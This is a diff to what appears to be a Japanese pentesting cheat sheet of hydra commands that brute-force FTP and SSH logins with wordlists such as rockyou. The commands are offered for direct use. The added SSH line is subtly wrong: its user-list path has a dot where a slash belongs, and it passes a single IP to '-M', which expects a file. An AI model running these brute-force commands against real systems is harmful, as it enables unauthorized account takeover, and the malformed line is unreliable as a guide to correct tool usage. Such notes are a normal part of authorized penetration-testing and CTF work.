@@ -1004,6 +1004,7 @@ ex (ftp):
 ・username も password もわからない時。
 hydra -L user.lst -P pass.lst -t 16 ターゲットIP ftp
 hydra -L user.lst -P pass.lst -t 8 ターゲットIP ftp
+hydra -L /usr/share/wordlists.rockyou.txt -P /usr/share/wordlists/rockyou.txt -M <targetIP> -t 4 ssh
 
 ・username わかってる時。
 hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 ssh://192.168.1.123
